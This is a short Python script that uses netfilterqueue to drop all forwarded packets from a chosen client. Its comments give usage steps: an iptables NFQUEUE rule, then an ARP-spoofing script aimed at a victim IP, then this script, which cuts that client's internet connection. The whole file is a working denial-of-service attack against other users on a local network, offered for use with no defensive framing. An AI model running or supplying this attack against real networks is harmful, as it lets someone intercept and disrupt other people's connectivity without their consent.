import netfilterqueue

# This program can be used to cut the internet connection
# from any client in the network.
# First you need to redirect outcome packets to a queue: 
# `iptables -I FORWARD -j NFQUEUE --queue-num 0`
# Next, we run ARP spoofing, for example: python3 ARP_spoofing.py --client 192.168.233.140 --access-point 192.168.233.2
# Finally, we run this script, all packet from 192.168.233.140 will be drop :)).

# After finish, one more thing u can do are flushing iptables: iptables --flush
def process_packet(packet):
    print(packet)
    
    # Accept and forward the packet: packet.accept() or drop it :))
    packet.drop()



def main():
    queue = netfilterqueue.NetfilterQueue()
    
    # Bind to queue number 0.
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
    main()